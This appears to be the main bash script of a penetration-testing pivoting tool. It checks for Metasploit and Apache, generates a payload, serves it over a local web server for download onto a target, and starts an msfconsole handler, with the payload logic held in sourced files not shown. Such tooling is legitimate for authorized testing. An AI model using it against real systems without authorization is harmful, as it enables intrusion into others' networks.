#!/usr/bin/env bash
clear

# Author: Karthik Sainadh Siddabattula :-)
# Website: http://techiekarthik.in
# Superpowers: CEH | Penetration tester | Security researcher
# GitHub: github.com/karthikgenius
# Research Gate: researchgate.net/profile/Karthik_Sainadh2


# handles colors stuff
source sourcelib/colors.sh

# handles error stuff
source sourcelib/error.sh

# handles all apache2 stuff
source sourcelib/serverweb.sh

# handles metasploit stuff
source sourcelib/metasploit.sh

# handles all errrors
source sourcelib/error.sh

# handles network stuff
source sourcelib/networkpref.sh

# handles cleaning stuff
source sourcelib/clean.sh

# handles resourcescript stuff
source sourcelib/msfresourcegeneration.sh

# banner print and error stuff
bannerPrinter || bannerError

# user check vars
CUR_USER=$(whoami)
REC_USER="root"

# check user
if [[ ! ${CUR_USER} = ${REC_USER} ]];
then
  echo -e "${RED}${NRML}Need to run under root user context! "
  exit 1
fi

# author details stuff
echo
echo -e "${BLUE}Feel free to report bug to author, If any:${NRML}"
echo -e "Twitter: ${GREENRAW}karthikgenius19${NRML}"
echo -e "LinkedIn: ${GREENRAW}karthiksainadh${NRML}"
echo -e "HacktheBox: ${GREENRAW}Karthik0x00${NRML}"
echo -e "------------------------------------"

# prompts user to hit enter
read -n 1 -s -r -p "Press ANY key to continue"
echo


# dependencies stuff
echo -e "------------------------------------"
echo -e "${YELLOW}${NRML}Checking for dependencies .."
echo
checkApache && echo -e "${GREEN}${NRML}Apache2 installed " || req_error apache2
checkMsfdb && echo -e "${GREEN}${NRML}MSFDB installed" || req_error msfdb
checkMsfconsole && echo -e "${GREEN}${NRML}MSFConsole installed" || req_error msfconsole
checkMsfvenom && echo -e "${GREEN}${NRML}MSFVenom installed" || req_error msfvenom
echo
echo -e "${GREEN}${NRML}Dependencies satisfied .."
echo -e "------------------------------------"


# payload deletion stuff
echo
echo -e "${YELLOW}${NRML}Checking for existing pivot payload .."
delete_payload && echo -e "${GREEN}${NRML}Pivot Payload cleaned" || noPayload
echo -e "------------------------------------"


# payload generation stuff
echo
echo -e "${YELLOW}${NRML}Generating Payload .."
generatePayload && echo -e "${GREEN}${NRML}Payload Generation Success" || errorPayloadGeneration
echo -e "------------------------------------"

# apache2 start stuff
echo
echo -e "${YELLOW}${NRML}Starting WebServer .."
apacheServer on && echo -e "${GREEN}${NRML}Apache2 status: ${APACHESTATUS} " || apacheFailed
echo -e "------------------------------------"

# msfdb start stuff
echo
echo -e "${YELLOW}${NRML}Starting MsfDB Server .."
msfDBServer on && echo -e "${GREEN}${NRML}Msfdb status: ${MSFDBSTATUS} " || msfdbFailed
echo -e "------------------------------------"


# resource script generation stuff
echo
echo -e "${YELLOW}${NRML}Generating rc files .. "
writePayloadHandler && echo -e "${GREEN}${NRML}Done Generating payloadhandler.rc file" || errorResourceScriptHandlerGeneration "writePayloadHandler"
writeRouteHandler && echo -e "${GREEN}${NRML}Done Generating routehandler.rc file" || errorResourceScriptHandlerGeneration "writeRouteHandler"
echo -e "------------------------------------"


# url stuff
echo
URL="http://${LOCALHOST}/${PAYLOADFILE}"
echo -e "${GREEN}${NRML}Go to ${URL} and download the payload on target .."
echo -e "------------------------------------"


# msfconsole starting stuff
echo
echo -e "${GREEN}${NRML}Starting metasploit framework .."
echo -e "------------------------------------"
msfconsole --quiet -r resource-scripts/payloadhandler.rc


sleep 1s
echo -e "${CYAN}==========================="
echo -e "|H0pe y0u h4d a gr34t h4ck|"
echo -e "===========================${NRML}"


# clean stuff
echo
echo -e "${GREEN}${NRML}Started cleaning the stuff"
echo

# payload clean stuff
echo -e "${YELLOW}${NRML}Cleaning Payload .."
delete_payload && echo -e "${GREEN}${NRML}Pivot Payload cleaned" || noPayload
echo -e "------------------------------------"

# apache server clean stuff
echo
echo -e "${YELLOW}${NRML}Turning off Apache2 server .."
apacheServer off && echo -e "${GREEN}${NRML}Apache2 status: ${APACHESTATUS} " || apacheFailed
echo -e "------------------------------------"

# msfdb server clean stuff
echo
echo -e "${YELLOW}${NRML}Turning off msfdb server .."
msfDBServer off && echo -e "${GREEN}${NRML}Msfdb status: ${MSFDBSTATUS} " || msfdbFailed
echo -e "------------------------------------"
